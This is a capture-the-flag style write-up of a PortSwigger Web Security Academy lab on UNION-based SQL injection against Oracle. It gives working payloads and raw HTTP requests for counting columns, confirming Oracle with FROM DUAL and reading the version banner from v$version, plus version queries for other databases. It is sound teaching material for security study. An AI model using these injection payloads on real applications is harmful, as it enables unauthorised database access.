# SQL Injection - Lab #7: SQL injection attack, querying the database type and version on Oracle

**YouTube Tutorial:** [SQL Injection - Lab #7 SQL injection attack, querying the database type and version on Oracle](https://www.youtube.com/watch?v=s0dFU2dKAKU)

---

## 1. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Core Concept:** A SQL injection vulnerability exists in the product category filter (`category`). The application processes user input directly into an SQL query and returns the query results directly within the HTTP response body.
* **Vulnerability Behavior:** Because the response contains database output, an attacker can leverage a `UNION`-based SQL injection to append their own database queries and extract data.

### Root Cause & Impact

* **Root Cause:** Unsanitized string concatenation in backend database queries without parameterization.
* **Requirements for UNION Exploitation on Oracle:**
1. The injected `SELECT` query must return the exact same number of columns as the original query.
2. The data types of corresponding columns must be compatible across both queries.
3. **Oracle-Specific Rule:** Every `SELECT` query in Oracle SQL must include a `FROM` clause. When querying non-table values or built-in functions/views, the `DUAL` table (`FROM DUAL`) or specific system tables must be specified.


* **Goal:** Determine the number of columns and data type compatibility, and perform a `UNION SELECT` attack querying the Oracle `v$version` system table to retrieve and display the database version string (`banner`).

---

## 2. Attack Methods & Techniques

### Method Details

* **Phase 1 (Column Count Enumeration):** Use `ORDER BY N--` to identify the total number of columns returned by the query.
* **Phase 2 (Oracle Database Verification & Data Type Identification):** Verify the Oracle syntax requirement by appending `FROM DUAL` in a `UNION SELECT 'a', 'a' FROM DUAL--` test query to confirm both columns accept string literals and validate that the database is running Oracle.
* **Phase 3 (Version Extraction):** Query the system view `v$version` to fetch the `banner` column using `UNION SELECT banner, NULL FROM v$version--`.

### Server Behavior

* **Missing FROM Clause / Syntax Error:** On Oracle databases, executing a `UNION SELECT` query without a `FROM` clause throws an SQL syntax error, causing the server to return an **HTTP 500 Internal Server Error**.
* **Compatible Data Type & Correct Syntax:** When using `FROM DUAL` or querying `v$version` with matching column counts and data types, the server returns an **HTTP 200 OK** and renders the Oracle version string on the page.

---

## 3. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Product Filter Request (category)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Determine Column Count (ORDER BY N--)        |
|  • ORDER BY 1, 2 -> HTTP 200 OK                       |
|  • ORDER BY 3    -> HTTP 500 Error                    |
|  Result: Total = 2 Columns                            |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Test Oracle Syntax & Data Types               |
|  • UNION SELECT 'a', 'a'--                            |
|    -> HTTP 500 Error (Missing FROM clause on Oracle)  |
|  • UNION SELECT 'a', 'a' FROM DUAL--                  |
|    -> HTTP 200 OK (Confirmed Oracle DB)               |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Query Oracle Version String                  |
|  UNION SELECT banner, NULL FROM v$version--           |
|  -> HTTP 200 OK (Version string rendered on page)     |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 5: Lab Solved Successfully                      |
+-------------------------------------------------------+

```

---

## 4. UML Sequence Diagram

```
Browser / User          Burp Suite Proxy          Web Application               Database (Oracle)
      |                         |                        |                         |
      |-- 1. GET /filter?cat=Gifts' ORDER BY 3-- ------->|                         |
      |                         |                        |-- 2. Execute SQL ------>|
      |                         |                        |<-- 3. Out-Of-Bounds ----|
      |<-- 4. HTTP 500 Error ---|<-- 5. Return 500 -------|                         |
      |                         |                        |                         |
      |== 6. Column count confirmed = 2 columns ===================================|
      |                         |                        |                         |
      |-- 7. GET /filter?cat=Gifts' UNION SELECT 'a','a'-- ----------------------->|
      |                         |                        |-- 8. Execute SQL ------>|
      |                         |                        |<-- 9. ORA-00923 Error --|
      |<-- 10. HTTP 500 Error --|<-- 11. Return 500 ------|   (FROM keyword missing)|
      |                         |                        |                         |
      |-- 12. GET /filter?cat=Gifts' UNION SELECT 'a','a' FROM DUAL-- ------------>|
      |                         |                        |-- 13. Execute SQL ----->|
      |                         |                        |<-- 14. Valid Response --|
      |<-- 15. HTTP 200 OK -----|<-- 16. Render 'a' ------|                         |
      |                         |                        |                         |
      |-- 17. GET /filter?cat=Gifts' UNION SELECT banner, NULL FROM v$version-- -->|
      |                         |                        |-- 18. Query v$version ->|
      |                         |                        |<-- 19. Banner String ---|
      |<-- 20. Lab Solved! -----|<-- 21. HTTP 200 OK -----|                         |

```

---

## 5. Step-by-Step Walkthrough

### Step 1: Determine Column Count

1. Test index ordering using `ORDER BY`:
* `GET /filter?category=Gifts'+ORDER+BY+1--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+2--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+3--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. **Result:** Query returns **2 columns**.

### Step 2: Confirm Oracle Database and String Compatibility

1. Test basic `UNION SELECT` without a table:
* `GET /filter?category=Gifts'+UNION+SELECT+'a',+'a'--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. Test using Oracle's required built-in dummy table `DUAL`:
* `GET /filter?category=Gifts'+UNION+SELECT+'a',+'a'+FROM+DUAL--` $\rightarrow$ **HTTP 200 OK**


3. **Result:** Confirms the backend is an Oracle database and both returned columns support string types.

### Step 3: Extract Oracle Database Version

Query the Oracle system dictionary view `v$version` to extract the `banner` column value into column position 1, leaving column position 2 as `NULL`:

* **Payload:**
```sql
Gifts' UNION SELECT banner, NULL FROM v$version--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+banner%2C+NULL+FROM+v%24version-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Response:** **HTTP 200 OK** $\rightarrow$ The database banner string (e.g., `Oracle Database 11g Express Edition Release...`) is rendered in the HTTP response body, solving the lab.

---

## 6. Pro-Tips & Common Pitfalls

* **Oracle `FROM` Clause Requirement:** Unlike PostgreSQL, MySQL, or SQL Server, Oracle strictly requires a `FROM` clause in every `SELECT` query. For queries that do not target a specific user table, always use `FROM DUAL`.
* **System Views for Version Retrieval:**
* **Oracle:** `SELECT banner FROM v$version` or `SELECT version FROM v$instance`
* **PostgreSQL / MySQL:** `SELECT version()`
* **Microsoft SQL Server:** `SELECT @@version`


* **URL Encoding Dollar Signs:** When querying `v$version`, ensure special characters like `$` are properly URL-encoded (`%24`) or passed correctly in Burp Suite to prevent request parsing issues.